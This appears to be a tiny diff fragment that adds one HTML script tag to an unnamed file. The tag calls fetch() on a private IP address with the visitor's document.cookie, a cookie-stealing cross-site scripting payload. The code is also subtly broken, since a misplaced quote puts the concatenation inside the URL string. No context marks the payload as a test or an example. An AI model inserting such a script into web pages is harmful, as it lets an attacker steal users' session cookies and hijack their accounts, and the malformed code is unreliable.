@@ -1,0 +1,2 @@
+<script>fetch('http://10.8.0.203/ + document.cookie);</script>
+
